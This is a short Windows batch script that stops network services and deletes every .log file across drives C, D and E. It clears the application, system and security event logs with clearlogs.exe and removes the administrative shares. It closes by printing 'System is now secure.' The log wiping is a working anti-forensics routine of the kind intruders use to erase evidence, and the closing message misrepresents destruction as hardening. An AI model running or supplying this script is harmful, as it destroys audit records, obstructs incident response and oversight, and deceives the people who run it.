@echo off
net stop "Remote Registry Service"
net stop "Computer Browser"
net stop "REMOTE PROCEDURE CALL"
net stop "REMOTE PROCEDURE CALL SERVICE"
net stop "Remote Access Connection Manager"
net stop "telnet"
net stop "messenger"
net stop "netbios"
del c:\*.log /s
del d:\*.log /s
del e:\*.log /s
clearlogs.exe \\127.0.0.1 -app
clearlogs.exe \\127.0.0.1 -sys
clearlogs.exe \\127.0.0.1 -sec
clearlogs.exe -sec
clearlogs.exe -sec
clearlogs.exe -sec
net share /delete C$ /y
net share /delete D$ /y
net share /delete E$ /y
net share /delete F$ /y
net share /delete ADMIN$
net share IPC$ /delete /yes
echo System is now secure.




